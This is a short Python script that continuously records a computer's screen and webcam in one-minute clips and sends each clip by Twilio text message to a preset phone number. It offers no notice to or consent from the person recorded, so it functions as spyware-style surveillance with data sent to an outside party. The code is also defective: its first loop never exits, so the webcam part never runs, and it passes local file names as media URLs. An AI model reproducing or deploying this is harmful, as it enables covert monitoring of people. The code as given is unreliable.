# pip install cv2 etc.

import cv2
import numpy as np
import time
import sys
import mss
import twilio
from twilio.rest import Client

# Twilio account information
account_sid = "Your Account SID"
auth_token = "Your Auth Token"
client = Client(account_sid, auth_token)
to_number = "Your Phone Number"
from_number = "Your Twilio Number"

counter_webcam = 0
counter_screen = 0

# Screen capture
with mss.mss() as sct:
    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
    while True:
        filename_screen = "screen_capture.mp4"
        screen_capture = cv2.VideoWriter(filename_screen, cv2.VideoWriter_fourcc(*"mp4v"), 30, (monitor["width"], monitor["height"]))
        
        start_time = time.time()
        while time.time() - start_time < 60:
            sct_img = sct.grab(monitor)
            frame = np.array(sct_img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
            screen_capture.write(frame)
        
        screen_capture.release()
        counter_screen += 1
        filename_screen = "screen_capture ({}).mp4".format(counter_screen)
        client.messages.create(to=to_number, from_=from_number, body="Screen Capture", media_url=["screen_capture.mp4"])

# Webcam capture
cap = cv2.VideoCapture(0)
while True:
    filename_webcam = "webcam_capture.mp4"
    webcam_capture = cv2.VideoWriter(filename_webcam, cv2.VideoWriter_fourcc(*"mp4v"), 30, (int(cap.get(3)), int(cap.get(4))))

    start_time = time.time()
    while time.time() - start_time < 60:
        ret, frame = cap.read()
        if ret:
            webcam_capture.write(frame)

    webcam_capture.release()
    counter_webcam += 1
    filename_webcam = "webcam_capture ({}).mp4".format(counter_webcam)
    client.messages.create(to=to_number, from_=from_number, body="Webcam Capture", media_url=["webcam_capture.mp4"])

cap.release()
cv2.destroyAllWindows()
